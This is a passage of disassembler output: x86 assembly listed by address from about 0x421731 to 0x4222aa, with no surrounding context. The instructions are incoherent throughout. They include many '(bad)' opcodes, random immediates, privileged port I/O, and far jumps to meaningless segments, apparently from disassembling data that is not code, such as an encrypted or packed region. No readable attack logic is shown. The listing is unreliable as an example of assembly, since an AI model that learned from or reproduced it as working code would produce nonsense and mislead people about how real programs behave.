  421731:	xchg   DWORD PTR [eax],esp
  421733:	push   0x6159104a
  421738:	call   0x8c2b6bba
  42173d:	bound  ebx,QWORD PTR [eax+0x7d597583]
  421743:	call   ebp
  421745:	shl    BYTE PTR [esi],0xbe
  421748:	lds    ebp,FWORD PTR [ecx+eiz*8-0x2f]
  42174c:	jnp    0x421743
  42174e:	fsubr  QWORD PTR [esi+esi*1+0x76e5a8a0]
  421755:	mov    bh,0xa
  421757:	mov    ds:0xfe16e04e,eax
  42175c:	sbb    dh,BYTE PTR [ebx]
  42175e:	xchg   edx,ebx
  421760:	stc    
  421761:	jecxz  0x421776
  421763:	sbb    BYTE PTR [ecx],bh
  421765:	mov    eax,ds:0xf0de8bfd
  42176a:	jle    0x42170a
  42176c:	mov    al,0x4e
  42176e:	test   al,0xdc
  421770:	out    0x4b,al
  421772:	sbb    DWORD PTR [edx+0x6e],edx
  421775:	popf   
  421776:	call   0x1818:0xc1acf823
  42177d:	and    esp,DWORD PTR [esi]
  42177f:	adc    eax,0x12d3ac10
  421784:	aam    0x8f
  421786:	mov    ecx,0x9e80c326
  42178b:	sub    esp,DWORD PTR [edi+0x162ef74c]
  421791:	add    DWORD PTR [ebp-0x6b679572],ecx
  421797:	js     0x42173f
  421799:	fild   DWORD PTR [ebx-0x61]
  42179c:	popa   
  42179d:	dec    ebp
  42179e:	call   DWORD PTR [eax+0x79b2788f]
  4217a4:	lods   al,BYTE PTR ds:[esi]
  4217a5:	fmul   DWORD PTR [esi-0x75]
  4217a8:	frstor [ecx]
  4217aa:	imul   esp,DWORD PTR [ebx],0x8c7f8d2b
  4217b0:	aas    
  4217b1:	dec    edi
  4217b2:	jge    0x421830
  4217b4:	fisttp WORD PTR [eax-0x34]
  4217b7:	or     al,0x5
  4217b9:	jmp    0xb10bafc7
  4217be:	in     eax,0x38
  4217c0:	push   edi
  4217c1:	pushf  
  4217c2:	inc    esi
  4217c3:	pop    ebx
  4217c4:	dec    edi
  4217c5:	jmp    0xd9f43ae8
  4217ca:	sbb    eax,0xa4fb
	...
  42199f:	add    BYTE PTR [eax],al
  4219a1:	shr    ah,cl
  4219a3:	and    edx,DWORD PTR [ecx]
  4219a5:	aas    
  4219a6:	fcomip st,st(2)
  4219a8:	out    dx,eax
  4219a9:	or     DWORD PTR [esi+0x3da2eacd],ebp
  4219af:	mov    ch,0xd2
  4219b1:	jnp    0x42197f
  4219b3:	add    DWORD PTR [eax],eax
  4219b5:	and    BYTE PTR [edi],al
  4219b7:	add    BYTE PTR [eax],al
  4219b9:	fcomp  DWORD PTR [bp+di]
  4219bc:	es inc ecx
  4219be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219bf:	sub    ebx,DWORD PTR [esi+0x69963ef8]
  4219c5:	jbe    0x421993
  4219c7:	dec    esp
  4219c8:	add    bl,BYTE PTR [eax+0x34]
  4219cb:	xlat   BYTE PTR ds:[ebx]
  4219cc:	imul   ebp,DWORD PTR [edx-0x58],0x6f
  4219d0:	sub    edi,edx
  4219d2:	imul   eax,DWORD PTR [edx-0x55fcd0fe],0x27ddf00b
  4219dc:	cld    
  4219dd:	or     DWORD PTR [ebp+0x27fdf08a],esi
  4219e3:	add    bh,dl
  4219e5:	cwde   
  4219e6:	pop    edx
  4219e7:	mov    edi,0x6d884501
  4219ec:	inc    edi
  4219ed:	jg     0x4219d1
  4219ef:	sbb    DWORD PTR [ebx-0x4547fb08],ebx
  4219f5:	aam    0xdb
  4219f7:	test   eax,0x116ce7c9
  4219fc:	cld    
  4219fd:	mov    ebp,0x8847c988
  421a02:	sti    
  421a03:	mov    ds:0xe3406ac6,al
  421a08:	enter  0xb0c,0x73
  421a0c:	fwait
  421a0d:	xchg   DWORD PTR [esi+esi*1],edx
  421a10:	push   cs
  421a11:	lea    ebx,[edx-0x10774ffd]
  421a17:	ret    0x5753
  421a1a:	shr    DWORD PTR [edx-0x51],1
  421a1d:	and    BYTE PTR [eax-0x2c],bl
  421a20:	inc    edi
  421a21:	in     eax,0xdb
  421a23:	xchg   edi,eax
  421a24:	pop    esi
  421a25:	fstp   TBYTE PTR [edi+ebx*2]
  421a28:	xchg   esp,eax
  421a29:	mov    DWORD PTR [edx+0x4bba2f25],edi
  421a2f:	jge    0x421a3d
  421a31:	inc    edi
  421a32:	sbb    eax,0x66a0c133
  421a37:	xchg   esi,eax
  421a38:	aaa    
  421a39:	push   ecx
  421a3a:	xor    al,0x5f
  421a3c:	cmp    BYTE PTR [ebx],cl
  421a3e:	jmp    0x4839c45
  421a43:	es pop edi
  421a45:	sbb    DWORD PTR [ecx+0x66],0xcc55b34b
  421a4c:	lods   eax,DWORD PTR ds:[esi]
  421a4d:	push   esi
  421a4e:	add    cl,dl
  421a50:	lds    ebp,FWORD PTR [esi-0x15d59945]
  421a56:	and    eax,0x796baf1
  421a5b:	stc    
  421a5c:	rcl    BYTE PTR [edx+0x42],1
  421a5f:	xor    edx,DWORD PTR [edx+0x4d129556]
  421a65:	cmp    eax,0xca14ac4c
  421a6a:	aaa    
  421a6b:	cld    
  421a6c:	inc    ebx
  421a6d:	sub    eax,0x400f3ce7
  421a73:	int    0xd0
  421a75:	mov    ecx,ebx
  421a77:	xchg   ebx,eax
  421a78:	push   esi
  421a79:	jns    0x421abf
  421a7b:	ret    0xab86
  421a7e:	out    0x3,eax
  421a80:	fnsave [ebx-0x43]
  421a83:	jae    0x421a34
  421a85:	mov    cl,BYTE PTR [ebx+0x77fb0707]
  421a8b:	push   esp
  421a8c:	call   0x3109:0x6f6bcf1d
  421a93:	fsub   QWORD PTR [ecx+0x5f]
  421a96:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  421a98:	cmp    BYTE PTR [ecx],0x47
  421a9b:	jg     0x421ab4
  421a9d:	mov    ebx,0x26c54735
  421aa2:	and    BYTE PTR [ecx+0xd5d7159],ah
  421aa8:	fwait
  421aa9:	and    al,0xc7
  421aab:	jb     0x421b2c
  421aad:	mov    al,0x56
  421aaf:	add    eax,0x91807e8b
  421ab4:	push   es
  421ab5:	iret   
  421ab6:	jbe    0x421a4d
  421ab8:	and    DWORD PTR [ecx+ebp*8-0x7b3340f7],esi
  421abf:	mov    esi,0x6a64b851
  421ac4:	xor    ebp,DWORD PTR [esi-0xa]
  421ac7:	add    eax,edi
  421ac9:	xchg   edx,eax
  421aca:	rol    DWORD PTR [edx+0x7bd6c9b5],1
  421ad0:	mov    bl,bl
  421ad2:	rcl    dh,0x91
  421ad5:	sbb    edx,DWORD PTR [ecx+0x2652550a]
  421adb:	int    0xfb
  421add:	mov    ebx,0xfe3dab8c
  421ae2:	dec    eax
  421ae3:	adc    DWORD PTR [edx-0xe],edx
  421ae6:	(bad)  
  421ae8:	sub    al,0x5b
  421aea:	cmp    eax,0xa053261d
  421aef:	out    dx,eax
  421af0:	repnz pop ds
  421af2:	mov    bh,0x8
  421af4:	lds    esp,FWORD PTR [ecx+ebp*1-0x29f954c3]
  421afb:	push   ebp
  421afc:	jmp    0xd723:0x178c4945
  421b03:	or     DWORD PTR [ebx-0x15bbc6a0],ebx
  421b09:	adc    eax,DWORD PTR [esi+0x4f]
  421b0c:	aam    0x28
  421b0e:	pop    ecx
  421b0f:	mov    bl,0x6e
  421b11:	std    
  421b12:	mov    edx,DWORD PTR [ebx]
  421b14:	pop    edx
  421b15:	jle    0x421b26
  421b17:	retf   0xc74c
  421b1a:	ret    
  421b1b:	cs pop edi
  421b1d:	pop    edx
  421b1e:	xor    cl,BYTE PTR [ebx]
  421b20:	jge    0x421ab5
  421b22:	xor    bl,ch
  421b24:	popf   
  421b25:	sub    bl,BYTE PTR [esi+0x518f2bdf]
  421b2b:	ds inc esi
  421b2d:	out    dx,eax
  421b2e:	ds mov edi,0xad71ea97
  421b34:	mov    dl,0xba
  421b36:	push   ebp
  421b37:	fcom   QWORD PTR [eax]
  421b39:	sub    ebp,DWORD PTR [ebx]
  421b3b:	sar    BYTE PTR [ebp+0x1c],0xa9
  421b3f:	fwait
  421b40:	dec    esp
  421b41:	or     al,0xfb
  421b43:	or     DWORD PTR [eax],eax
  421b45:	pop    esp
  421b46:	popa   
  421b47:	sar    DWORD PTR [eax-0xaf9cc74],cl
  421b4d:	add    BYTE PTR [ecx],bl
  421b4f:	mov    dh,0x5a
  421b51:	ss loop 0x421ba8
  421b54:	mov    ch,0xbd
  421b56:	push   esp
  421b57:	sub    BYTE PTR [ecx+0x35],bh
  421b5a:	xor    cl,BYTE PTR [esi+0x3370ca1d]
  421b60:	fadd   DWORD PTR [edx]
  421b62:	jmp    0xd19f:0xc8fbe4fe
  421b69:	jb     0x421b97
  421b6b:	mov    eax,ds:0x63a06d1d
  421b70:	das    
  421b71:	loopne 0x421b4c
  421b73:	les    ecx,FWORD PTR [ebp-0x60]
  421b76:	xchg   edx,eax
  421b77:	in     eax,dx
  421b78:	clc    
  421b79:	mov    BYTE PTR [esi+edx*2+0x26],ah
  421b7d:	xor    BYTE PTR [edx],0x61
  421b80:	jnp    0x421b69
  421b82:	push   ebx
  421b83:	mov    ebx,DWORD PTR [ebx]
  421b85:	pusha  
  421b86:	out    0x70,eax
  421b88:	lock stos BYTE PTR es:[edi],al
  421b8a:	mov    ds:0xcd0f044d,al
  421b8f:	xlat   BYTE PTR ds:[ebx]
  421b90:	sbb    BYTE PTR [edi],al
  421b92:	bound  eax,QWORD PTR [ecx+eax*2+0x61]
  421b96:	xchg   ecx,eax
  421b97:	mov    BYTE PTR fs:[edi],bl
  421b9a:	and    BYTE PTR [eax],bh
  421b9c:	in     al,0xab
  421b9e:	push   0x2d2c9927
  421ba3:	xchg   ebp,eax
  421ba4:	pop    ss
  421ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ba6:	or     BYTE PTR [edx-0x16],ch
  421ba9:	scas   eax,DWORD PTR es:[edi]
  421baa:	xchg   ecx,eax
  421bab:	ret    
  421bac:	xor    DWORD PTR [eax+0x6a],ecx
  421baf:	cmp    al,0x41
  421bb1:	imul   ecx,DWORD PTR [esi+edx*4],0x46
  421bb5:	cld    
  421bb6:	hlt    
  421bb7:	test   al,0xda
  421bb9:	jp     0x421bae
  421bbb:	mov    eax,ds:0x2b22ad7
  421bc0:	in     eax,dx
  421bc1:	(bad)  
  421bc2:	std    
  421bc3:	gs mov cl,0x3c
  421bc6:	cs pop ebp
  421bc8:	clc    
  421bc9:	cmp    esp,DWORD PTR [esi-0x67e53810]
  421bcf:	dec    edx
  421bd0:	push   ss
  421bd1:	lods   eax,DWORD PTR ds:[esi]
  421bd2:	xor    bl,BYTE PTR [esi+0x91fbc36]
  421bd8:	(bad)  
  421bd9:	xchg   ebp,eax
  421bda:	inc    esp
  421bdb:	mov    eax,0x5d98994c
  421be0:	test   BYTE PTR [ebx+0x66],al
  421be3:	push   ecx
  421be4:	repz int 0xce
  421be7:	cmp    eax,0x5f4af72c
  421bec:	mov    esp,0xbbb43fc4
  421bf1:	and    BYTE PTR [ebx-0x557181fb],0x7f
  421bf8:	jnp    0x421c31
  421bfa:	mov    ds:0xe3ede8b2,eax
  421bff:	xchg   ebp,eax
  421c00:	push   ss
  421c01:	iret   
  421c02:	lahf   
  421c03:	pop    ds
  421c04:	cmp    DWORD PTR [ebp-0x14],esp
  421c07:	loope  0x421c49
  421c09:	bound  edx,QWORD PTR [eax-0x26c2a5f8]
  421c0f:	iret   
  421c10:	fadd   QWORD PTR [edx+ebp*8]
  421c13:	shl    BYTE PTR [ebx+0x6b],cl
  421c16:	inc    ebp
  421c17:	push   0x20af83c6
  421c1c:	cmp    BYTE PTR [ecx],cl
  421c1e:	(bad)  
  421c1f:	and    al,0x8c
  421c21:	adc    DWORD PTR [ecx-0x5ec8ae3a],0xf45bd2e2
  421c2b:	fcom   st(7)
  421c2d:	das    
  421c2e:	lea    edx,ss:[ebp+0x63]
  421c32:	push   ss
  421c33:	adc    eax,esp
  421c35:	in     al,dx
  421c36:	ins    BYTE PTR es:[edi],dx
  421c37:	adc    bl,0xf1
  421c3a:	push   ds
  421c3b:	daa    
  421c3c:	out    dx,eax
  421c3d:	mov    ah,0xe9
  421c3f:	adc    DWORD PTR [esi-0x34ef193],ebp
  421c45:	or     esp,DWORD PTR [edx]
  421c47:	xchg   edi,eax
  421c48:	loopne 0x421be7
  421c4a:	mov    bl,0x33
  421c4c:	sub    eax,0x996316f2
  421c51:	mov    ds:0x2cafb16e,eax
  421c56:	jno    0x421c4c
  421c58:	cs mov ecx,0x19e9a677
  421c5e:	in     eax,0x3e
  421c60:	test   cl,bh
  421c62:	xchg   DWORD PTR [edi+0x24],eax
  421c65:	mov    BYTE PTR [ecx+0x510b7b01],0xf
  421c6c:	leave  
  421c6d:	frstor [ebp+0x62]
  421c70:	cmp    esp,ebx
  421c72:	mov    ds:0xfacf704a,eax
  421c77:	add    al,0x53
  421c79:	int3   
  421c7a:	push   edx
  421c7b:	mov    bl,0xea
  421c7d:	and    DWORD PTR ds:0xb34d091b,0xffffffe5
  421c84:	pop    ebp
  421c85:	cmp    ebx,DWORD PTR [esi]
  421c87:	in     al,0xd4
  421c89:	xchg   edx,eax
  421c8a:	jne    0x421cb5
  421c8c:	adc    eax,0xb78e835f
  421c91:	sbb    eax,ebp
  421c93:	mov    al,0x1
  421c95:	jecxz  0x421c52
  421c97:	fld    TBYTE PTR [ebx+0x6cb5f4ee]
  421c9d:	psllw  mm7,QWORD PTR ds:0x4923ea59
  421ca4:	lea    edx,[ebp-0x6]
  421ca7:	lods   al,BYTE PTR ds:[esi]
  421ca8:	dec    ebx
  421ca9:	pop    ebx
  421caa:	aaa    
  421cab:	adc    DWORD PTR [edx],ebx
  421cad:	pop    esp
  421cae:	xchg   bx,ax
  421cb0:	stos   DWORD PTR es:[edi],eax
  421cb1:	xlat   BYTE PTR ds:[ebx]
  421cb2:	test   DWORD PTR [ecx+0x6600076b],edi
  421cb8:	push   edi
  421cb9:	mov    ds:0xd6a14f95,al
  421cbe:	cmp    dh,bh
  421cc0:	retf   
  421cc1:	sub    BYTE PTR [ebx-0x65],bh
  421cc4:	test   al,0x5c
  421cc6:	test   DWORD PTR [edx+ecx*4+0x1b],eax
  421cca:	cmc    
  421ccb:	fdiv   QWORD PTR [edx]
  421ccd:	fcomp  QWORD PTR [eax]
  421ccf:	mov    bh,0x86
  421cd1:	dec    esi
  421cd2:	fidivr DWORD PTR [eax+0x15bb93cc]
  421cd8:	pop    edi
  421cd9:	xchg   esp,eax
  421cda:	mov    ebx,0x97879315
  421cdf:	getsec 
  421ce1:	pop    esp
  421ce2:	nop
  421ce3:	cmp    ah,BYTE PTR [edi-0x51]
  421ce6:	loop   0x421ce8
  421ce8:	rcl    BYTE PTR [ebx-0x4ae056e3],cl
  421cee:	mov    ds,WORD PTR [edi]
  421cf0:	push   ecx
  421cf1:	mov    ds,WORD PTR [edx-0x5b]
  421cf4:	ds push cs
  421cf6:	pop    ebp
  421cf7:	jns    0x421d6b
  421cf9:	pop    ss
  421cfa:	sbb    DWORD PTR [eax+0x488c3678],ecx
  421d00:	jp     0x421cc0
  421d02:	pop    edi
  421d03:	pop    esp
  421d04:	cmc    
  421d05:	add    al,0x26
  421d07:	int    0xf9
  421d09:	aas    
  421d0a:	mov    ebp,0xd772becc
  421d0f:	inc    ebp
  421d10:	fxam   
  421d12:	or     al,0xa2
  421d14:	call   0x374b6e4b
  421d19:	imul   ebx,DWORD PTR [ebp+0x64],0xec683772
  421d20:	rcl    edx,cl
  421d22:	mov    ds:0xe5fa5dc9,eax
  421d27:	mov    ah,bh
  421d29:	inc    edx
  421d2a:	sahf   
  421d2b:	popf   
  421d2c:	xchg   ebx,eax
  421d2d:	jnp    0x421d5e
  421d2f:	jae    0x421cf4
  421d31:	dec    ebx
  421d32:	mov    bh,0x5d
  421d34:	lods   eax,DWORD PTR ds:[esi]
  421d35:	xor    DWORD PTR [ecx],eax
  421d37:	scas   eax,DWORD PTR es:[edi]
  421d38:	jp     0x421cc1
  421d3a:	jecxz  0x421d0e
  421d3c:	adc    eax,ebx
  421d3e:	push   edx
  421d3f:	cmp    DWORD PTR [ebp-0x357a21c2],edi
  421d45:	push   edx
  421d46:	and    ah,al
  421d48:	dec    esi
  421d49:	pop    ds
  421d4a:	fisttp QWORD PTR [esi+0x526a2d42]
  421d50:	jle    0x421d58
  421d52:	into   
  421d53:	mov    esp,0x104d7aad
  421d58:	ins    BYTE PTR es:[edi],dx
  421d59:	mov    cs,WORD PTR [edx]
  421d5b:	and    ch,ah
  421d5d:	inc    eax
  421d5e:	popa   
  421d5f:	pop    ds
  421d60:	mov    ebx,0x50b020c6
  421d65:	mov    ds:0x60c9319d,eax
  421d6a:	clc    
  421d6b:	jp     0x421dc9
  421d6d:	add    esp,DWORD PTR [ecx-0x8a5a58d]
  421d73:	scas   ax,WORD PTR es:[edi]
  421d75:	fs popa 
  421d77:	fsubr  QWORD PTR [ecx-0x10]
  421d7a:	fs push ecx
  421d7c:	add    eax,0xe7846b4d
  421d81:	and    ah,dh
  421d83:	ins    BYTE PTR es:[edi],dx
  421d84:	imul   esp,DWORD PTR ds:0xee4fdaf7,0x4005b961
  421d8e:	mov    cl,0xca
  421d90:	mov    bh,0x59
  421d92:	adc    DWORD PTR [edi],esp
  421d94:	mov    al,0x63
  421d96:	xchg   edx,eax
  421d97:	stc    
  421d98:	es pushf 
  421d9a:	lods   al,BYTE PTR ds:[esi]
  421d9b:	dec    esi
  421d9c:	daa    
  421d9d:	shr    DWORD PTR ds:0xcbf49565,cl
  421da3:	lds    eax,FWORD PTR [edi+0xfae0897]
  421da9:	fwait
  421daa:	call   DWORD PTR [edi]
  421dac:	sub    ebx,DWORD PTR [ecx]
  421dae:	pop    ss
  421daf:	rol    DWORD PTR [edi+esi*4-0x46],1
  421db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421db4:	sub    BYTE PTR [esi-0xf17f0ed],dh
  421dba:	je     0x421dd0
  421dbc:	pop    edx
  421dbd:	xchg   esi,eax
  421dbe:	jne    0x421e0d
  421dc0:	jmp    0x65cd:0x5d704bab
  421dc7:	enter  0x9d54,0x9b
  421dcb:	adc    DWORD PTR ds:[esi-0x3],ebp
  421dcf:	mov    bh,ah
  421dd1:	ins    BYTE PTR es:[edi],dx
  421dd2:	jmp    0x92c1e312
  421dd7:	mov    WORD PTR [edx+0x363cfa6],es
  421ddd:	pop    edx
  421dde:	mov    ebp,0xf46dec38
  421de3:	ins    BYTE PTR es:[edi],dx
  421de4:	int3   
  421de5:	ss push ss
  421de7:	pop    eax
  421de8:	dec    eax
  421de9:	or     bh,dh
  421deb:	mov    WORD PTR [edx+0x732876d8],cs
  421df1:	mov    eax,ds:0xa6497cbb
  421df6:	jns    0x421d7c
  421df8:	jbe    0x421dc8
  421dfa:	adc    esi,DWORD PTR [esi]
  421dfc:	xor    al,0x51
  421dfe:	shr    ah,cl
  421e00:	xchg   esp,eax
  421e01:	cmp    eax,0xa3d3915b
  421e06:	in     eax,0xc3
  421e08:	out    0x56,al
  421e0a:	xor    BYTE PTR [edx+0x71d24a73],al
  421e10:	xchg   edi,eax
  421e11:	shr    BYTE PTR ds:0x6e5699c0,1
  421e17:	call   0x8957:0xd5a549b1
  421e1e:	hlt    
  421e1f:	dec    ebp
  421e20:	test   BYTE PTR [edi+0x2d8e2e9e],0xdd
  421e27:	inc    edx
  421e28:	pop    ebp
  421e29:	scas   eax,DWORD PTR es:[edi]
  421e2a:	or     dh,bl
  421e2c:	jmp    0x52c8a023
  421e31:	repz fisubr WORD PTR [ebx+0x60a6af37]
  421e38:	cmp    al,0x7
  421e3a:	lods   eax,DWORD PTR ds:[esi]
  421e3b:	mov    ebx,0x84010978
  421e40:	sub    dl,BYTE PTR [eax-0x6c5fac39]
  421e46:	div    DWORD PTR [edx+edi*1]
  421e49:	mov    DWORD PTR [ebx-0x4febaea8],ebp
  421e4f:	ret    0xe7a7
  421e52:	gs pop eax
  421e54:	jle    0x421e12
  421e56:	xor    eax,0x8e9e701f
  421e5b:	add    edi,0xffffffb6
  421e5e:	add    BYTE PTR [ebx-0x12],dh
  421e61:	adc    BYTE PTR [esi-0x1f],dh
  421e64:	or     DWORD PTR ds:0x24e18d2,ebp
  421e6a:	cmc    
  421e6b:	xlat   BYTE PTR ds:[bx]
  421e6d:	cwde   
  421e6e:	je     0x421e17
  421e70:	stc    
  421e71:	out    0xf4,al
  421e73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e74:	cmp    ebx,DWORD PTR [edx]
  421e76:	adc    eax,0xec2bcbb2
  421e7b:	imul   esi,DWORD PTR [esi*2+0x4b4a79d1],0x8caab35c
  421e86:	adc    DWORD PTR [eax+0xfcb78fd],ebx
  421e8c:	enter  0x1c46,0xec
  421e90:	int    0x80
  421e92:	mov    bl,0x88
  421e94:	xor    DWORD PTR [ebx+0x730439b5],edx
  421e9a:	(bad)  
  421e9c:	mov    bl,0x67
  421e9e:	sub    DWORD PTR [esi+edi*2],esp
  421ea1:	ins    BYTE PTR es:[edi],dx
  421ea2:	mov    ecx,0xebc0f568
  421ea7:	or     eax,0xcfc85677
  421eac:	pop    ecx
  421ead:	push   0xffffffe8
  421eaf:	push   ebx
  421eb0:	push   cs
  421eb1:	fst    DWORD PTR [edx]
  421eb3:	pusha  
  421eb4:	rcr    BYTE PTR [ecx-0x5aab0f2f],0xec
  421ebb:	out    dx,al
  421ebc:	cmp    ebp,DWORD PTR ds:[ebx-0x5971160]
  421ec3:	loopne 0x421efc
  421ec5:	add    BYTE PTR fs:[ecx-0x1c],ch
  421ec9:	jo     0x421e95
  421ecb:	cli    
  421ecc:	dec    ebx
  421ecd:	retf   
  421ece:	and    al,0x4f
  421ed0:	cmp    al,0x97
  421ed2:	in     eax,dx
  421ed3:	push   esp
  421ed4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ed5:	fisttp QWORD PTR ds:0x629c811e
  421edb:	xlat   BYTE PTR ds:[ebx]
  421edc:	mov    dh,0x10
  421ede:	cmp    esi,DWORD PTR [ebx+0x3]
  421ee1:	ja     0x421ef3
  421ee3:	ret    0xd708
  421ee6:	jns    0x421f24
  421ee8:	cwde   
  421ee9:	cwde   
  421eea:	mov    dl,0xd0
  421eec:	fs sub al,0xe4
  421eef:	stc    
  421ef0:	mov    ah,0x20
  421ef2:	sub    al,bh
  421ef4:	inc    esp
  421ef5:	push   0x2f821c2e
  421efa:	mov    dl,0x44
  421efc:	xor    eax,0x206dd5a6
  421f01:	out    dx,al
  421f02:	jg     0x421ec0
  421f04:	fist   WORD PTR [ecx-0x45]
  421f07:	push   esi
  421f08:	sbb    DWORD PTR [ebx-0x3e],ebx
  421f0b:	add    eax,0xa13c8a9b
  421f10:	call   0x6b64081a
  421f15:	and    al,0x98
  421f17:	and    al,0x30
  421f19:	neg    BYTE PTR ds:0x96c80a51
  421f1f:	mov    bl,0x58
  421f21:	sbb    eax,0x6bf6698d
  421f26:	imul   edx,DWORD PTR [edi-0x27],0x29
  421f2a:	inc    esp
  421f2b:	xchg   esi,eax
  421f2c:	mov    edx,0x818d8a19
  421f31:	arpl   bx,di
  421f33:	xor    al,0xd8
  421f35:	cld    
  421f36:	xchg   edx,eax
  421f37:	cwde   
  421f38:	cmp    ch,al
  421f3a:	jb     0x421f69
  421f3c:	pop    edx
  421f3d:	popf   
  421f3e:	push   cs
  421f3f:	jb     0x421f39
  421f41:	dec    ebx
  421f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f43:	(bad)  
  421f45:	in     al,0xa9
  421f47:	push   ecx
  421f48:	sub    edx,DWORD PTR [esi-0x23f11e35]
  421f4e:	dec    ecx
  421f4f:	mov    DWORD PTR [esi],eax
  421f51:	hlt    
  421f52:	push   cs
  421f53:	xor    BYTE PTR [edi],dh
  421f55:	es pop edx
  421f57:	xchg   BYTE PTR [ebp+0xa20f89e],bh
  421f5d:	imul   ebx,ebx,0x5a
  421f60:	jo     0x421fb3
  421f62:	pop    es
  421f63:	sub    ecx,DWORD PTR [esp+esi*1+0xae25591]
  421f6a:	sub    ecx,DWORD PTR [ecx*4+0x684843b]
  421f71:	sbb    DWORD PTR ds:0xd0ce60b2,eax
  421f77:	out    dx,al
  421f78:	sbb    ah,dl
  421f7a:	ins    DWORD PTR es:[edi],dx
  421f7b:	(bad)  
  421f7c:	mov    dh,0x5d
  421f7e:	bound  edx,QWORD PTR [esi]
  421f80:	mov    esi,0x242a8193
  421f85:	scas   eax,DWORD PTR es:[edi]
  421f86:	mov    esi,0xee816c74
  421f8b:	jb     0x421f63
  421f8d:	inc    eax
  421f8e:	test   al,0x1a
  421f90:	mov    dh,0x6e
  421f92:	or     esp,DWORD PTR ds:[edi+0x13]
  421f96:	pop    ds
  421f97:	sbb    ch,BYTE PTR [edx+0x5]
  421f9a:	dec    ebp
  421f9b:	aam    0x12
  421f9d:	and    eax,0xb47db838
  421fa2:	das    
  421fa3:	pop    esp
  421fa4:	xchg   ecx,eax
  421fa5:	xchg   esp,eax
  421fa6:	cwde   
  421fa7:	adc    dl,BYTE PTR [edi]
  421fa9:	repnz adc al,0xd
  421fac:	pop    ecx
  421fad:	push   0x9
  421faf:	fs mov cl,0x6f
  421fb2:	scas   al,BYTE PTR es:[edi]
  421fb3:	adc    bl,0x3b
  421fb6:	add    eax,0xec5a9a77
  421fbb:	or     eax,0xb25421f8
  421fc0:	jnp    0x421fc3
  421fc2:	lea    eax,ds:0x6f2867cc
  421fc8:	sub    DWORD PTR [eax+0x10],esi
  421fcb:	test   DWORD PTR [eax+0x211bddc],eax
  421fd1:	leave  
  421fd2:	std    
  421fd3:	sbb    cl,BYTE PTR [edx]
  421fd5:	pop    ebx
  421fd6:	and    cl,BYTE PTR [ecx-0x7da8e3fa]
  421fdc:	pop    eax
  421fdd:	fwait
  421fde:	pop    edx
  421fdf:	lods   eax,DWORD PTR ds:[esi]
  421fe0:	mov    dl,BYTE PTR [ecx+0x67]
  421fe3:	das    
  421fe4:	pop    esp
  421fe5:	jmp    0xbbe9:0x14b69b26
  421fec:	add    BYTE PTR [ebx+ebx*2],0xf5
  421ff0:	sub    edx,esi
  421ff2:	inc    edx
  421ff3:	stc    
  421ff4:	jl     0x422037
  421ff6:	add    BYTE PTR [ecx+edi*2-0x177641ab],0x44
  421ffe:	add    BYTE PTR [edi],0xa1
  422001:	inc    esp
  422002:	fist   WORD PTR [edx-0x18b110e9]
  422008:	mov    ch,0x90
  42200a:	and    eax,0x7b7690cd
  42200f:	scas   eax,DWORD PTR es:[edi]
  422010:	pop    edi
  422011:	or     eax,DWORD PTR [ecx]
  422013:	fdivr  st,st(4)
  422015:	jge    0x422016
  422017:	aam    0xcb
  422019:	rcr    DWORD PTR [edi+0x3a4824e],0xc9
  422020:	mov    al,ds:0x972568f2
  422025:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  422027:	xor    al,0xf1
  422029:	mov    ebx,0xc405ed74
  42202e:	push   ebp
  42202f:	cmp    bl,bl
  422031:	dec    edx
  422032:	mov    fs,WORD PTR [ecx+edx*8+0x4000d45a]
  422039:	(bad)  
  42203b:	ja     0x421fe0
  42203d:	inc    edx
  42203e:	adc    esp,ebx
  422040:	cs iret 
  422042:	adc    BYTE PTR [esi-0x71],0xf2
  422046:	ins    BYTE PTR es:[edi],dx
  422047:	arpl   WORD PTR [eax],di
  422049:	dec    eax
  42204a:	(bad)  
  42204b:	int3   
  42204c:	pop    eax
  42204d:	mov    ah,0xdd
  42204f:	aaa    
  422050:	sub    DWORD PTR [esp+ecx*2+0x539f0bb4],edi
  422057:	jnp    0x42205c
  422059:	ror    ecx,cl
  42205b:	xor    BYTE PTR [ebx+0x15],dh
  42205e:	sbb    eax,0x8a24f072
  422063:	jp     0x422013
  422065:	xchg   DWORD PTR [ebx],eax
  422067:	sub    DWORD PTR [esp+esi*2-0x7b],edx
  42206b:	outs   dx,BYTE PTR ds:[esi]
  42206c:	(bad)  
  42206d:	pop    ebx
  42206e:	fbld   TBYTE PTR [edx]
  422070:	add    esi,DWORD PTR [esi-0x5c]
  422073:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  422075:	inc    ebx
  422076:	xor    ebp,esi
  422078:	push   edx
  422079:	hlt    
  42207a:	mov    dh,0x2b
  42207c:	push   ebp
  42207d:	inc    ebx
  42207e:	mov    bh,0x45
  422080:	sub    al,0x79
  422082:	mov    ebx,0x9f87c9e1
  422087:	jae    0x4220f7
  422089:	popf   
  42208a:	mov    dh,0x71
  42208c:	push   eax
  42208d:	in     eax,dx
  42208e:	ja     0x422033
  422090:	dec    ebp
  422091:	in     eax,0xa0
  422093:	test   al,bl
  422095:	aad    0xee
  422097:	cld    
  422098:	dec    esp
  422099:	call   0x5d16:0x4adf15e1
  4220a0:	out    dx,al
  4220a1:	pop    edx
  4220a2:	ins    BYTE PTR es:[edi],dx
  4220a3:	mov    cs,WORD PTR ds:0x4142860b
  4220a9:	cmp    al,0xfd
  4220ab:	hlt    
  4220ac:	lea    edi,[ebp-0x54]
  4220af:	push   cs
  4220b0:	jmp    0xe16:0xf9e0de9f
  4220b7:	(bad)  
  4220b8:	aas    
  4220b9:	les    esp,FWORD PTR [ecx+0x305fbdcc]
  4220bf:	loope  0x422105
  4220c1:	(bad)  
  4220c2:	shr    BYTE PTR [ebx-0x4699f2e0],1
  4220c8:	sahf   
  4220c9:	xchg   ecx,eax
  4220ca:	dec    ebx
  4220cb:	in     eax,dx
  4220cc:	scas   eax,DWORD PTR es:[edi]
  4220cd:	cwde   
  4220ce:	call   0xdd4:0x8dae000
  4220d5:	xor    edx,ebp
  4220d7:	int3   
  4220d8:	pop    ecx
	...
  4222a9:	dec    ecx
  4222aa:	dec    eax
